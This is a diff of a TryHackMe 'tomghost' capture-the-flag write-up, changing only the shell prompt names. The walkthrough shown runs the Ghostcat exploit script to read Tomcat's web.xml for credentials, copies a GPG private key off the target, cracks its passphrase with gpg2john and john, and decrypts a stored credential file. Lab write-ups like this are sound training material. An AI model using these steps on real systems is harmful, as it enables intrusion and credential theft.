@@ -17,7 +17,7 @@ This vulnerability report identified a mechanism that allowed: - returning arbit
 ```
 I found a exploit scrip call [ajpShooter.py](https://github.com/00theway/Ghostcat-CNVD-2020-10487).
 ```console
-kali@kali:~/THM/tomghost$ python3 ajpShooter.py <tomcat ip:port> <ajp port> /WEB-INF/web.xml read 
+bibo318@parrot:~/THM/tomghost$ python3 ajpShooter.py <tomcat ip:port> <ajp port> /WEB-INF/web.xml read 
 ```
 you should recive a credential here
 ```html
@@ -45,15 +45,15 @@ damn we dont have permission to open it but... we can use what we found to gain 
 
 we can use john to crack `tryhackme.asc` and get the password then use the password to decrypt `credential.pgp`. let copy the prive block key to our kali and crack it using `john`.
 ```console
-kali@kali:~/THM/tomghost$ scp skyfuck@10.10.187.16:/home/skyfuck/tryhackme.asc . # copy using scp
+bibo318@parrot:~/THM/tomghost$ scp skyfuck@10.10.187.16:/home/skyfuck/tryhackme.asc . # copy using scp
 skyfuck@10.10.187.16's password: 
 ```
 `tryhackme.asc` is a private gpg key which john cannot handle it direckly, we need to convert the private key to a hash using `gpg2john`. thereafter we can use john to crack the hash. So let do it
 ```console
-kali@kali:~/THM/tomghost$ find / -name gpg2john 2> /dev/null
+bibo318@parrot:~/THM/tomghost$ find / -name gpg2john 2> /dev/null
 /usr/sbin/gpg2john
-root@kali:~# gpg2john /home/kali/THM/tomghost/tryhackme.asc /home/kali/THM/tomghost/key.txt # convert gpg key to hash for john
-root@kali:~# john /home/kali/THM/tomghost/key.txt -wordlist=/usr/share/wordlists/rockyou.txt 
+bibo318@kali:~# gpg2john /home/kali/THM/tomghost/tryhackme.asc /home/kali/THM/tomghost/key.txt # convert gpg key to hash for john
+bibo318@kali:~# john /home/kali/THM/tomghost/key.txt -wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
 Cost 1 (s2k-count) is 65536 for all loaded hashes
@@ -68,7 +68,7 @@ Session completed
 ```
 now we know the password to the key, we can then import the key into our key ring. then use it to decrypt `credential.pgp`.
 ```console
-kali@kali:~/THM/tomghost$ gpg --import tryhackme.asc 
+bibo318@parrot:~/THM/tomghost$ gpg --import tryhackme.asc 
 gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
 gpg: key 8F3DA3DEC6707170: secret key imported
 gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
@@ -77,10 +77,10 @@ gpg:               imported: 1
 gpg:              unchanged: 1
 gpg:       secret keys read: 1
 gpg:   secret keys imported: 1
-kali@kali:~/THM/tomghost$ scp skyfuck@10.10.187.16:/home/skyfuck/credential.pgp . # copy it
+bibo318@parrot:~/THM/tomghost$ scp skyfuck@10.10.187.16:/home/skyfuck/credential.pgp . # copy it
 skyfuck@10.10.187.16's password: 
 credential.pgp                                                    100%  394     7.9KB/s   00:00   
-kali@kali:~/THM/tomghost$ gpg --decrypt credential.pgp 
+bibo318@parrot:~/THM/tomghost$ gpg --decrypt credential.pgp 
 gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
 gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
       "tryhackme <stuxnet@tryhackme.com>"
